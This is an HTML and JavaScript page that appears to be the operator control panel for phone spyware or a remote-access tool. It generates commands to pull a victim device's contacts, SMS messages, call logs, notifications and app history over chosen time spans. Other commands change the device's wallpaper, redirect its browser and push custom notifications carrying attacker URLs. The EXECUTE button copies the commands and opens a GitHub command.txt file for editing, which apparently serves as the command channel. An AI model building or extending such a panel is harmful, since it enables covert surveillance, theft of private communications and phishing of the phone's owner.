<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>Cyberpunk Command Generator</title>

<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;600&family=Rajdhani:wght@400;500&display=swap" rel="stylesheet">

<style>

*{box-sizing:border-box;margin:0;padding:0;}

body{
background:radial-gradient(circle at 20% 20%,#0f172a,#020617 60%),linear-gradient(180deg,#020617,#000);
color:#00ffff;
font-family:'Rajdhani',sans-serif;
min-height:100vh;
padding-bottom:80px;
}

/* TOP BUTTON */
.topbar{
padding:10px;
text-align:center;
border-bottom:1px solid #00ffff33;
}

.topbtn{
display:inline-block;
padding:10px 18px;
border:1px solid #00ffff;
border-radius:10px;
color:#00ffff;
text-decoration:none;
font-family:'Orbitron';
transition:0.2s;
}

.topbtn:hover{
background:#00ffff;
color:black;
box-shadow:0 0 15px #00ffff;
}

.header{
font-family:'Orbitron';
font-size:22px;
letter-spacing:2px;
text-align:center;
padding:15px;
text-shadow:0 0 10px #00ffff;
}

.container{
max-width:700px;
margin:auto;
padding:14px;
}

.panel{
background:rgba(0,0,0,0.6);
border:1px solid #00ffff55;
border-radius:14px;
padding:14px;
margin-bottom:14px;
box-shadow:0 0 10px #00ffff22,inset 0 0 10px #00ffff11;
}

.panel-title{
font-family:'Orbitron';
font-size:13px;
margin-bottom:10px;
color:#ff00ff;
letter-spacing:2px;
text-shadow:0 0 5px #ff00ff;
}

.grid{
display:grid;
grid-template-columns:1fr 1fr;
gap:8px;
}

.tile{
display:flex;
align-items:center;
gap:8px;
padding:10px;
border-radius:10px;
background:#020617;
border:1px solid #00ffff33;
cursor:pointer;
}

.tile:hover{
border:1px solid #00ffff;
box-shadow:0 0 10px #00ffff88;
}

.tile input{
appearance:none;
width:18px;
height:18px;
border:1px solid #00ffff;
background:black;
cursor:pointer;
}

.tile input:checked{
background:#00ffff;
box-shadow:0 0 10px #00ffff;
}

.input{
width:100%;
padding:12px;
margin-top:8px;
border-radius:10px;
background:black;
border:1px solid #ff00ff55;
color:#00ffff;
outline:none;
}

.btn{
width:100%;
padding:12px;
margin-top:10px;
background:black;
border:1px solid #00ffff;
color:#00ffff;
font-family:'Orbitron';
cursor:pointer;
border-radius:10px;
}

.btn:hover{
background:#00ffff;
color:black;
box-shadow:0 0 15px #00ffff;
}

.output{
width:100%;
height:150px;
background:black;
border:1px solid #00ff88;
border-radius:10px;
padding:12px;
color:#00ff88;
font-family:monospace;
}

.notification-box{
border:1px solid #ff00ff55;
padding:10px;
border-radius:10px;
margin-top:10px;
}

.action{
position:fixed;
bottom:0;
width:100%;
background:black;
border-top:1px solid #00ffff55;
padding:10px;
}

</style>
</head>
<body>

<div class="topbar">
<a href="/RKP-ControlPanel/Tracking" class="topbtn">GO TO TERMINAL</a>
</div>

<div class="header">CYBERPUNK COMMAND SYSTEM</div>

<div class="container">

<!-- DEVICE -->
<div class="panel">
<div class="panel-title">Single Command</div>

<div class="grid">
<label class="tile"><input type="checkbox" data-cmd="deviceinfo">deviceinfo</label>
  <label class="tile"><input type="checkbox" data-cmd="contacts full">contacts full</label>
</div>

<input id="wallpaperUrl" class="input" placeholder="Wallpaper URL">
<button class="btn" onclick="addWallpaper()">ADD WALLPAPER</button>
</div>

<!-- APPS -->
<div class="panel">
<div class="panel-title">APPS DATA</div>
<div class="grid">
<label class="tile"><input type="checkbox" data-cmd="apps full">apps full</label>
<label class="tile"><input type="checkbox" data-cmd="apps 1d">apps 1d</label>
<label class="tile"><input type="checkbox" data-cmd="apps 7d">apps 7d</label>
<label class="tile"><input type="checkbox" data-cmd="apps 30d">apps 30d</label>
<label class="tile"><input type="checkbox" data-cmd="apps installed 1d">apps installed 1d</label>
<label class="tile"><input type="checkbox" data-cmd="apps installed 7d">apps installed 7d</label>
<label class="tile"><input type="checkbox" data-cmd="apps installed 30d">apps installed 30d</label>
</div>
</div>

<!-- SMS -->
<div class="panel">
<div class="panel-title">SMS DATA</div>
<div class="grid">
<label class="tile"><input type="checkbox" data-cmd="sms full">sms full</label>
<label class="tile"><input type="checkbox" data-cmd="sms 1d">sms 1d</label>
<label class="tile"><input type="checkbox" data-cmd="sms 7d">sms 7d</label>
<label class="tile"><input type="checkbox" data-cmd="sms 30d">sms 30d</label>
</div>
</div>

<!-- CALL -->
<div class="panel">
<div class="panel-title">CALL DATA</div>
<div class="grid">
<label class="tile"><input type="checkbox" data-cmd="calls full">calls full</label>
<label class="tile"><input type="checkbox" data-cmd="calls 1d">calls 1d</label>
<label class="tile"><input type="checkbox" data-cmd="calls 7d">calls 7d</label>
<label class="tile"><input type="checkbox" data-cmd="calls 30d">calls 30d</label>
</div>
</div>

<!-- NOTIFICATION -->
<div class="panel">
<div class="panel-title">NOTIFICATION DATA</div>
<div class="grid">
<label class="tile"><input type="checkbox" data-cmd="notification full">notification full</label>
<label class="tile"><input type="checkbox" data-cmd="notification 1d">notification 1d</label>
<label class="tile"><input type="checkbox" data-cmd="notification 7d">notification 7d</label>
<label class="tile"><input type="checkbox" data-cmd="notification 30d">notification 30d</label>
<label class="tile"><input type="checkbox" data-cmd="no notification">no notification</label>
</div>
</div>


<!-- CUSTOM -->
<div class="panel">
<div class="panel-title">CUSTOM NOTIFICATION</div>
<div id="notifications"></div>
<button class="btn" onclick="addNotificationBox()">ADD NOTIFICATION BOX</button>
</div>

<!-- OUTPUT -->
<div class="panel">
<div class="panel-title">OUTPUT TERMINAL</div>
<textarea id="result" class="output"></textarea>
</div>

</div>

<div class="action">
<button class="btn" onclick="execute()">EXECUTE</button>
</div>


<script>

let redirectCommands=[]
let wallpaperCommands=[]
let notificationCommands=[]

function addRedirect(){
let url=document.getElementById("redirectUrl").value
if(url)
redirectCommands.push("redirect url "+url)
}

function addWallpaper(){
let url=document.getElementById("wallpaperUrl").value
if(url)
wallpaperCommands.push("change wallpaper "+url)
}

function addNotificationBox(){
let box=document.createElement("div")
box.className="notification-box"
box.innerHTML=`
Title:<input class="ntitle input"><br>
Message:<input class="nmessage input"><br>
Repeat:<input class="nrepeat input" value="1"><br>
Button:<input class="nbutton input"><br>
URL:<input class="nurl input"><br>
`
document.getElementById("notifications").appendChild(box)
}

function generate(){

let cmds=[]

document.querySelectorAll("input[type=checkbox]:checked")
.forEach(cb=>cmds.push(cb.dataset.cmd))

cmds=cmds.concat(redirectCommands)
cmds=cmds.concat(wallpaperCommands)

let notif=[]

document.querySelectorAll(".notification-box")
.forEach(box=>{

let title=box.querySelector(".ntitle").value
let message=box.querySelector(".nmessage").value
let repeat=box.querySelector(".nrepeat").value
let button=box.querySelector(".nbutton").value
let url=box.querySelector(".nurl").value

if(title && message){

let cmd="send notification | title="+title+" | message="+message

if(repeat) cmd+=" | repeat="+repeat
if(button) cmd+=" | button="+button
if(url) cmd+=" | url="+url

notif.push(cmd)

}

})

let notifText=notif.join(",,,,,")

let final=cmds.join(", ")

if(notifText){

if(final) final+=", "

final+=notifText

}

document.getElementById("result").value=final

}

function copy(){

let text=document.getElementById("result")

text.select()

document.execCommand("copy")

alert("Copied")

}

/* EXECUTE FUNCTION */
function execute(){

generate()

let text=document.getElementById("result")

text.select()

document.execCommand("copy")

/* redirect ONLY after copy */
window.location.href="https://github.com/MOFO-UG/ControlTheWorld/edit/main/command.txt"

}

</script>

</body>
</html>
